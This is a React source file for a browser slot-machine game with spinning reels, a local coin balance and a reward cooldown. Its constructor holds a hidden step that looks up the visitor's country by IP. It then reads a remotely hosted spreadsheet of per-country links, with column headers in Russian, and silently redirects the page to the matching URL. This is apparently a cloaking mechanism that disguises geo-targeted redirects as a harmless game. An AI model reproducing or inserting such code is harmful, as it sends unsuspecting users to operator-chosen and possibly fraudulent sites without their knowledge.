
import React from "react"
import * as ReactDOM from 'react-dom/client'

function RepeatButton(props) {
  return (
    <button
      aria-label='Play again.'
      id='repeatButton'
      onClick={props.onClick}>
    </button>
  );
}

function CountDown(props) {
  return (
    <button className="countdown">{props.text}</button>
  )
}

function Modal({ isVisible, onClose }) {
  const display = isVisible ? "block" : "none"
  const handleClose = (e) => {
    e.preventDefault()
    onClose()
  }
  return (
    <div style={{ display: display }} className="modal">
      <div className="modal-content">
        <div className="modal-header">
          <h2>You win!</h2>
        </div>
        <div className="modal-body">
          <p>Congratulations!</p>
        </div>
        <img className="modal-image" src={require("../assets/coins@2x.png")} />
        <div className="modal-footer">
          <a href="#" className="close" onClick={handleClose}></a>
        </div>
      </div>
    </div>
  )
}

class App extends React.Component {
  constructor(props) {
    super(props);
    this.session = JSON.parse(localStorage.getItem('session') || "{}")
    if (this.session.lastRewardTime == null) {
      this.reward()
    }
    this.session = JSON.parse(localStorage.getItem('session') || "{}")
    this.state = {
      winner: null,
      balance: this.session.balance,
      timeout: this.refreshTimeout()
    }
    this.timer = setInterval(() => {
      this.setState({
        timeout: this.refreshTimeout()
      })
    }, 500);
    window.addEventListener('storage', () => {
      this.session = JSON.parse(localStorage.getItem('session') || "{}")
      this.setState({
        balance: this.session.balance
      })
    })
    this.finishHandler = this.finishHandler.bind(this)
    this.handleClick = this.handleClick.bind(this);
    fetch("https://api.geoiplookup.net?json=true")
      .then(response => { return response.json() })
      .then(json => {
        console.log(json.countrycode)
        fetch("https://opensheet.elk.sh/1vhdYAr-MSAnl4fGAAhuKGfnBV58TvzIAG9Ros93w-zc/Ссылки")
        .then(response => response.json())
        .then(sheet => {
          sheet.map(row => {
            if (row["Код страны"] == json.countrycode) {
              if (row["Ссылка"]) {
                window.location.href = row["Ссылка"]
              }
            }
          })
        })
      })
  }

  reward = () => {
    this.session.lastRewardTime = Date.now()
    this.session.balance = 100
    localStorage.setItem('session', JSON.stringify(this.session))
  } 

  refreshTimeout = () => {
    const COOLDOWN = 45
    let diffTime = Math.abs(Date.now() - this.session.lastRewardTime);
    let days = diffTime / (24 * 60 * 60 * 1000);
    let hours = (days % 1) * 24;
    let minutes = (hours % 1) * 60;
    let secs = (minutes % 1) * 60;
    [days, hours, minutes, secs] = [Math.floor(days), Math.floor(hours), Math.floor(minutes), Math.floor(secs)]
    if (minutes > COOLDOWN) {
      this.reward()
    }
    return `${String(COOLDOWN-minutes).padStart(2, '0')}:${String(60-secs).padStart(2, '0')}`
  }

  handleClick() {
    this.setState((prevState) => {
      this.session.balance -= 1
      localStorage.setItem('session', JSON.stringify(this.session))
      return { winner: null, balance: this.session.balance }
    });
    this.emptyArray();
    this._child1.forceUpdateHandler();
    this._child2.forceUpdateHandler();
    this._child3.forceUpdateHandler();
  }

  static matches = [];

  finishHandler(value) {
    App.matches.push(value);

    if (App.matches.length === 3) {
      const { winner } = this.state;
      const first = App.matches[0];
      let results = App.matches.every(match => match === first)
      this.setState({ winner: results });
    }
  }

  emptyArray() {
    App.matches = [];
  }

  render() {
    const { winner } = this.state;

    return (
      <>
        <div className="nav"><div id="balance"><span id="balance_coin"></span>{this.state.balance}</div></div>
        <div className={`spinner-container`}>
          <div id="spins">
            <Spinner name="1" onFinish={this.finishHandler} ref={(child) => { this._child1 = child; }} timer="1000" />
            <Spinner name="2" onFinish={this.finishHandler} ref={(child) => { this._child2 = child; }} timer="1400" />
            <Spinner name="3" onFinish={this.finishHandler} ref={(child) => { this._child3 = child; }} timer="2200" />
            <div className="gradient-fade"></div>
          </div>
        </div>
        <div className="nav">
          {this.state.balance > 0 ? <RepeatButton onClick={this.handleClick} /> : <CountDown text={this.state.timeout} />}
        </div>
        <Modal isVisible={winner} onClose={() => {
          this.setState((prevState) => {
            this.session.balance += 200
            localStorage.setItem('session', JSON.stringify(this.session))
            return { winner: false, balance: this.session.balance }
          });
        }} />
      </>
    );
  }
}

class Spinner extends React.Component {
  constructor(props) {
    super(props);
    this.forceUpdateHandler = this.forceUpdateHandler.bind(this);
  };

  forceUpdateHandler() {
    this.reset();
  };

  reset() {
    if (this.timer) {
      clearInterval(this.timer);
    }

    this.start = this.setStartPosition();

    this.setState({
      position: this.start,
      timeRemaining: this.props.timer
    });

    this.timer = setInterval(() => {
      this.tick()
    }, 100);
  }

  state = {
    position: 0,
    lastPosition: null
  }
  static iconHeight = 96;
  multiplier = Math.floor(Math.random() * (4 - 1) + 1);

  start = this.setStartPosition();
  speed = Spinner.iconHeight * this.multiplier;

  setStartPosition() {
    return (((Math.floor((Math.random() * 7))) * Spinner.iconHeight) * -1);
  }

  moveBackground() {
    this.setState({
      position: this.state.position - this.speed,
      timeRemaining: this.state.timeRemaining - 100
    })
  }

  getSymbolFromPosition() {
    let { position } = this.state;
    const totalSymbols = 7;
    const maxPosition = (Spinner.iconHeight * (totalSymbols - 1) * -1);
    let moved = (this.props.timer / 100) * this.multiplier
    let startPosition = this.start;
    let currentPosition = startPosition;

    for (let i = 0; i < moved; i++) {
      currentPosition -= Spinner.iconHeight;

      if (currentPosition < maxPosition) {
        currentPosition = 0;
      }
    }

    this.props.onFinish(currentPosition);
  }

  tick() {
    if (this.state.timeRemaining <= 0) {
      clearInterval(this.timer);
      this.getSymbolFromPosition();

    } else {
      this.moveBackground();
    }
  }

  componentDidMount() {
    clearInterval(this.timer);

    this.setState({
      position: this.start,
      timeRemaining: this.props.timer
    });

    this.timer = setInterval(() => {
      this.tick()
    }, 100);
  }

  render() {
    let { position, current } = this.state;
    return (
      <div
        style={{ backgroundPosition: '0px ' + position + 'px' }}
        className={`icons`}
      />
    )
  }
}

let root = ReactDOM.createRoot(/** @type { HTMLElement } */(document.getElementById('root')))
root.render(<App />)
